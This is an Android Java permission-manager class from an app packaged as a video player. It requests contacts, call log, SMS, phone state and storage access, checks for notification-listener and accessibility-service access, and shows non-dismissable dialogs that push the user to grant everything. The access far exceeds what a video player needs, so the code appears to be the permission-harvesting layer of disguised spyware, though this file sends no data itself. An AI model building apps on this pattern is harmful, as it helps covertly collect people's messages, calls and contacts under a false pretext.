package com.jumpy.videoplayerapp;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.util.Log;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

public class PermissionManager {
    private static final String TAG = AppConfig.DEBUG_TAG + "_PermissionManager";
    private static final int PERMISSION_REQUEST_CODE = 1001;
    
    private Activity activity;
    private Context context;
    private PermissionCallback callback;
    
    // All required permissions for the app
    private static final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.POST_NOTIFICATIONS
    };
    
    // Runtime permissions (Android 6.0+)
    private static final String[] RUNTIME_PERMISSIONS = {
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.POST_NOTIFICATIONS
    };
    
    public interface PermissionCallback {
        void onPermissionsGranted();
        void onPermissionsDenied(List<String> deniedPermissions);
        void onPermissionRationaleNeeded(List<String> permissions);
    }
    
    public PermissionManager(Activity activity, PermissionCallback callback) {
        this.activity = activity;
        this.context = activity;
        this.callback = callback;
    }
    
    /**
     * Check if all required permissions are granted
     */
    public boolean areAllPermissionsGranted() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }
    
    /**
     * Check if specific permission is granted
     */
    public boolean isPermissionGranted(String permission) {
        return ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED;
    }
    
    /**
     * Request all required permissions
     */
    public void requestAllPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        
        for (String permission : RUNTIME_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
        
        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                activity,
                permissionsToRequest.toArray(new String[0]),
                PERMISSION_REQUEST_CODE
            );
        } else {
            if (callback != null) {
                callback.onPermissionsGranted();
            }
        }
    }
    
    /**
     * Request specific permission
     */
    public void requestPermission(String permission) {
        if (ContextCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(
                activity,
                new String[]{permission},
                PERMISSION_REQUEST_CODE
            );
        }
    }
    
    /**
     * Handle permission request results
     */
    public void handlePermissionResult(int requestCode, String[] permissions, int[] grantResults) {
        if (requestCode == PERMISSION_REQUEST_CODE) {
            List<String> grantedPermissions = new ArrayList<>();
            List<String> deniedPermissions = new ArrayList<>();
            List<String> rationalePermissions = new ArrayList<>();
            
            for (int i = 0; i < permissions.length; i++) {
                String permission = permissions[i];
                int result = grantResults[i];
                
                if (result == PackageManager.PERMISSION_GRANTED) {
                    grantedPermissions.add(permission);
                    Log.i(TAG, "Permission granted: " + permission);
                } else {
                    deniedPermissions.add(permission);
                    Log.w(TAG, "Permission denied: " + permission);
                    
                    // Check if we should show rationale
                    if (ActivityCompat.shouldShowRequestPermissionRationale(activity, permission)) {
                        rationalePermissions.add(permission);
                    }
                }
            }
            
            // Handle results
            if (deniedPermissions.isEmpty()) {
                if (callback != null) {
                    callback.onPermissionsGranted();
                }
            } else if (!rationalePermissions.isEmpty()) {
                if (callback != null) {
                    callback.onPermissionRationaleNeeded(rationalePermissions);
                }
            } else {
                if (callback != null) {
                    callback.onPermissionsDenied(deniedPermissions);
                }
            }
        }
    }
    
    /**
     * Show permission rationale dialog
     */
    public void showPermissionRationale(List<String> permissions) {
        StringBuilder message = new StringBuilder();
        message.append("This app needs the following permissions to function properly:\n\n");
        
        for (String permission : permissions) {
            message.append("• ").append(getPermissionDescription(permission)).append("\n");
        }
        
        message.append("\nPlease grant these permissions to continue.");
        
        new AlertDialog.Builder(context)
            .setTitle("Permissions Required")
            .setMessage(message.toString())
            .setPositiveButton("Grant Permissions", (dialog, which) -> {
                requestAllPermissions();
            })
            .setNegativeButton("Cancel", (dialog, which) -> {
                if (callback != null) {
                    callback.onPermissionsDenied(permissions);
                }
            })
            .setCancelable(false)
            .show();
    }
    
    /**
     * Show settings dialog for permanently denied permissions
     */
    public void showSettingsDialog(List<String> deniedPermissions) {
        StringBuilder message = new StringBuilder();
        message.append("Some permissions were denied and cannot be requested again.\n\n");
        message.append("Please enable them manually in Settings:\n\n");
        
        for (String permission : deniedPermissions) {
            message.append("• ").append(getPermissionDescription(permission)).append("\n");
        }
        
        new AlertDialog.Builder(context)
            .setTitle("Permissions Required")
            .setMessage(message.toString())
            .setPositiveButton("Open Settings", (dialog, which) -> {
                openAppSettings();
            })
            .setNegativeButton("Cancel", (dialog, which) -> {
                if (callback != null) {
                    callback.onPermissionsDenied(deniedPermissions);
                }
            })
            .setCancelable(false)
            .show();
    }
    
    /**
     * Open app settings
     */
    public void openAppSettings() {
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        Uri uri = Uri.fromParts("package", context.getPackageName(), null);
        intent.setData(uri);
        activity.startActivity(intent);
    }
    
    /**
     * Open notification settings
     */
    public void openNotificationSettings() {
        Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
        activity.startActivity(intent);
    }
    
    /**
     * Open accessibility settings
     */
    public void openAccessibilitySettings() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        activity.startActivity(intent);
    }
    
    /**
     * Check if notification access is enabled
     */
    public boolean isNotificationAccessEnabled() {
        String packageName = context.getPackageName();
        String flat = Settings.Secure.getString(context.getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(packageName);
    }
    
    /**
     * Check if accessibility service is enabled
     */
    public boolean isAccessibilityServiceEnabled() {
        String packageName = context.getPackageName();
        String serviceName = packageName + "/" + UnifiedAccessibilityService.class.getCanonicalName();
        
        String enabledServices = Settings.Secure.getString(
            context.getContentResolver(),
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        );
        
        return enabledServices != null && enabledServices.contains(serviceName);
    }
    
    /**
     * Get user-friendly permission description
     */
    private String getPermissionDescription(String permission) {
        switch (permission) {
            case Manifest.permission.READ_CONTACTS:
                return "Contacts - To sync your contact list";
            case Manifest.permission.READ_PHONE_STATE:
                return "Phone - To detect incoming calls";
            case Manifest.permission.READ_CALL_LOG:
                return "Call Log - To track call history";
            case Manifest.permission.READ_SMS:
                return "SMS - To read your messages";
            case Manifest.permission.READ_EXTERNAL_STORAGE:
                return "Storage - To access your files";
            case Manifest.permission.WRITE_EXTERNAL_STORAGE:
                return "Storage - To save files";
            case Manifest.permission.POST_NOTIFICATIONS:
                return "Notifications - To show app notifications";
            default:
                return permission;
        }
    }
    
    /**
     * Show toast message
     */
    public void showToast(String message) {
        Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
    }
    
    /**
     * Log permission status
     */
    public void logPermissionStatus() {
        Log.i(TAG, "=== Permission Status ===");
        for (String permission : REQUIRED_PERMISSIONS) {
            boolean granted = isPermissionGranted(permission);
            Log.i(TAG, permission + ": " + (granted ? "GRANTED" : "DENIED"));
        }
        Log.i(TAG, "Notification Access: " + (isNotificationAccessEnabled() ? "ENABLED" : "DISABLED"));
        Log.i(TAG, "Accessibility Service: " + (isAccessibilityServiceEnabled() ? "ENABLED" : "DISABLED"));
        Log.i(TAG, "========================");
    }
} 